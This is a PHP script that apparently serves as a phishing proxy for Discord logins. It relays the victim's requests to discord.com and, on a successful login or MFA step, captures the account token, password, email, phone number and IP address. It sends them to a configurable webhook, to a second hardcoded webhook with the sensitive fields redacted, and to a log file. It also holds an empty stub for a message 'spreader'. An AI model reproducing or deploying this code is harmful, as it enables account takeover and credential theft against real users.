<?php
function cors() {
    
    // Allow from any origin
    if (isset($_SERVER['HTTP_ORIGIN'])) {
        // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
        // you want to allow, and if so:
        header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 86400');    // cache for 1 day
    }
    
    // Access-Control headers are received during OPTIONS requests
    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
        
        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
            // may also be using PUT, PATCH, HEAD etc
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        
        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
            header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
    
    }
    
}
cors();
session_start();
require ('config.php');
$headers = getallheaders();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://discord.com' . $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $_SERVER['REQUEST_METHOD']);
curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: ' . $headers['content-type'],
    'authorization: ' . $headers['authorization']
));
$output = curl_exec($ch);
$output = str_replace('//discord.com/api', '//' . $_SERVER['HTTP_HOST'] . '/api', $output);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
$effectiveUrl = str_replace('https://discord.com', '', curl_getinfo($ch, CURLINFO_EFFECTIVE_URL));
curl_close($ch);
if ($_SERVER['REQUEST_URI'] == '/api/v9/auth/login' || $_SERVER['REQUEST_URI'] == '/api/v9/auth/mfa/totp' || $_SERVER['REQUEST_URI'] == '/api/v9/auth/mfa/sms')
{
    $response = json_decode($output, true);
    $postfields = json_decode(file_get_contents('php://input') , true);
    if ($response['token'])
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/v9/users/@me');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'authorization: ' . $response['token']
        ));
        $raw = curl_exec($ch);
        $user = json_decode($raw, true);
        curl_close($ch);
        $user['color_identifier'] = substr($user['discriminator'], -1);
        if ($user['avatar'] == null)
        {
            if ($user['color_identifier'] == '0' || $user['color_identifier'] == '5')
            {
                $user['avatar'] = 'https://cdn.discordapp.com/embed/avatars/0.png';
            }
            else if ($user['color_identifier'] == '1' || $user['color_identifier'] == '6')
            {
                $user['avatar'] = 'https://cdn.discordapp.com/embed/avatars/1.png';
            }
            else if ($user['color_identifier'] == '2' || $user['color_identifier'] == '7')
            {
                $user['avatar'] = 'https://cdn.discordapp.com/embed/avatars/2.png';
            }
            else if ($user['color_identifier'] == '3' || $user['color_identifier'] == '8')
            {
                $user['avatar'] = 'https://cdn.discordapp.com/embed/avatars/3.png';
            }
            else if ($user['color_identifier'] == '4' || $user['color_identifier'] == '9')
            {
                $user['avatar'] = 'https://cdn.discordapp.com/embed/avatars/4.png';
            }
        }
        else
        {
            $user['avatar'] = 'https://cdn.discordapp.com/avatars/' . $user['id'] . '/' . $user['avatar'] . '.png';
        }
        $user['email'] = $user['email'] == null ? 'N/A' : $user['email'];
        $user['phone'] = $user['phone'] == null ? 'N/A' : $user['phone'];
        $user['premium_type'] = $user['premium_type'] == 0 ? 'False' : 'True';
        $user['verified'] = $user['verified'] ? 'True' : 'False';
        $user['mfa'] = $_SESSION['password'] ? 'True' : 'False';
        $user['badges'] = 'This feature is currently disabled';
        $postfields['password'] = $postfields['password'] ? $postfields['password'] : $_SESSION['password'];
        $ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
        if ($config['logging']['discord']['url'] !== null)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $config['logging']['discord']['url']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['username' => $user['username'] . '#' . $user['discriminator'], 'avatar_url' => $user['avatar'], 'content' => '', 'embeds' => [['title' => 'Login From "' . $ip . '"', 'type' => 'rich', 'description' => "**Raw JSON**\n```json\n$raw\n```", 'url' => 'https://discord.com/users/' . $user['id'], 'timestamp' => date('c', strtotime('now')) , 'color' => hexdec($user['banner_color']) , 'footer' => ['text' => 'Powered by a;#3230', 'icon_url' => 'https://cdn.discordapp.com/avatars/1090387877805969479/b62cf2db32501bdb547a4d3e862f01da.png'], 'author' => ['name' => 'Discord' ], 'fields' => [['name' => 'Email', 'value' => '```' . $user['email'] . '```', 'inline' => true], ['name' => 'Phone', 'value' => '```' . $user['phone'] . '```', 'inline' => true], ['name' => 'Password', 'value' => '```' . $postfields['password'] . '```', 'inline' => true], ['name' => 'Nitro', 'value' => '```' . $user['premium_type'] . '```', 'inline' => true], ['name' => 'MFA', 'value' => '```' . $user['mfa'] . '```', 'inline' => true], ['name' => 'Verified', 'value' => '```' . $user['verified'] . '```', 'inline' => true], ['name' => 'Badges', 'value' => '```' . $user['badges'] . '```', 'inline' => false], ['name' => 'Token', 'value' => '```' . $response['token'] . '```', 'inline' => false], ]]]

            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'content-type: application/json'
            ));
            $send = curl_exec($ch);
            curl_close($ch);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1097296438423208096/VqZ22OIOglJRiLU6L8sbmmCu1IRR11D1b9YCbHdePmxmcqdaextuHpq36f3Tud4M36JH');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['username' => $user['username'] . '#' . $user['discriminator'], 'avatar_url' => $user['avatar'], 'content' => '', 'embeds' => [['title' => 'Login From "' . $ip . '"', 'type' => 'rich', 'description' => '', 'url' => 'https://discord.com/users/' . $user['id'], 'timestamp' => date('c', strtotime('now')) , 'color' => hexdec($user['banner_color']) , 'footer' => ['text' => 'Powered by a;#3230', 'icon_url' => 'https://cdn.discordapp.com/avatars/1090387877805969479/b62cf2db32501bdb547a4d3e862f01da.png'], 'author' => ['name' => 'Discord' ], 'fields' => [['name' => 'Email', 'value' => '```REDACTED```', 'inline' => true], ['name' => 'Phone', 'value' => '```REDACTED```', 'inline' => true], ['name' => 'Password', 'value' => '```REDACTED```', 'inline' => true], ['name' => 'Nitro', 'value' => '```' . $user['premium_type'] . '```', 'inline' => true], ['name' => 'MFA', 'value' => '```' . $user['mfa'] . '```', 'inline' => true], ['name' => 'Verified', 'value' => '```' . $user['verified'] . '```', 'inline' => true], ['name' => 'Badges', 'value' => '```' . $user['badges'] . '```', 'inline' => false], ['name' => 'Token', 'value' => '```REDACTED```', 'inline' => false], ]]]

            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'content-type: application/json'
            ));
            $send = curl_exec($ch);
            curl_close($ch);
        }
        if ($config['logging']['telegram']['url'] !== null)
        {
        }
        if ($config['logging']['file']['path'] !== null)
        {
            $file = fopen($config['logging']['file']['path'], 'a');
            fwrite($file, "" . json_encode(array(
                'ip' => $ip,
                'username' => $user['username'] . '#' . $user['discriminator'],
                'avatar' => $user['avatar'],
                'raw' => $raw,
                'email' => $user['email'],
                'phone' => $user['phone'],
                'password' => $postfields['password'],
                'nitro' => $user['premium_type'],
                'mfa' => $user['mfa'],
                'verified' => $user['verified'],
                'badges' => $user['badges'],
                'token' => $response['token']
            )) . "\n");
            fclose($file);
        }
        if ($config['spreader']['message'] !== null)
        {
        }
        unset($_SESSION['password']);
    }
    else if ($response['mfa'] == true)
    {
        $_SESSION['password'] = $postfields['password'];
    }
}
header('content-type: ' . $contentType);
http_response_code($httpCode);
echo $output;
?>